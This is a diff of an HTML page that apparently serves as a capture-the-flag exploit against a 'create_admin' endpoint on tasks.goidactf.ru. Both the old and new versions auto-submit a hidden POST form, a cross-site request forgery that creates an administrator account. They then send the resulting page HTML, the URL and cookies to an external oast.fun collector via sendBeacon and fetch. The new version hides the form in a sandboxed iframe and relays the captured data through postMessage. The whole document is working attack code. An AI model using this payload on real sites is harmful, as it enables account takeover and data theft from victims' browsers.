@@ -1,48 +1,26 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="utf-8">
-  <meta name="referrer" content="unsafe-url">   <!-- максимально подробный Referer -->
-</head>
 <body>
-
-<form id="boom" 
-      action="https://tasks.goidactf.ru:20431/create_admin" 
-      method="POST"
-      referrerpolicy="unsafe-url">
-  <input type="hidden" name="new_admin_login" value="hacker_no_ssl_314159">
-</form>
-
+<iframe id="n" sandbox="allow-scripts" style="display:none"></iframe>
 <script>
-  // сразу отправляем
-  document.getElementById('boom').submit();
+const inner = `
+  <form id="p" action="https://tasks.goidactf.ru:20431/create_admin" method="POST">
+    <input type="hidden" name="new_admin_login" value="hacker_2026_flag">
+  </form>
+  <script>
+    document.getElementById('p').submit();
+    setTimeout(() => {
+      let d = document.body.innerHTML.substring(0, 1500);
+      navigator.sendBeacon("https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun", d);
+      parent.postMessage({data: d}, "*");
+    }, 1500);
+  <\/script>
+`;
+document.getElementById('n').srcdoc = inner;
 
-  // ждём и смотрим, куда нас закинуло (редирект? ошибка? новая страница?)
-  setTimeout(() => {
-    const data = {
-      url: window.location.href,
-      html: document.body.innerHTML.substring(0, 2000),
-      title: document.title,
-      cookie: document.cookie || "no visible cookie"
-    };
-
-    navigator.sendBeacon(
-      "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun",
-      JSON.stringify(data)
-    );
-    // или классический fetch с no-cors
-    fetch("https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun", {
-      method: "POST",
-      mode: "no-cors",
-      keepalive: true,
-      body: JSON.stringify(data)
-    });
-  }, 5000);  // 5 секунд обычно хватает
+window.addEventListener("message", e => {
+  fetch("https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun", {method: "POST", mode: "no-cors", body: JSON.stringify(e.data)});
+});
 </script>
-
-<noscript>
-  <meta http-equiv="refresh" content="0; url=https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun?noscript=1">
-</noscript>
-
 </body>
 </html>
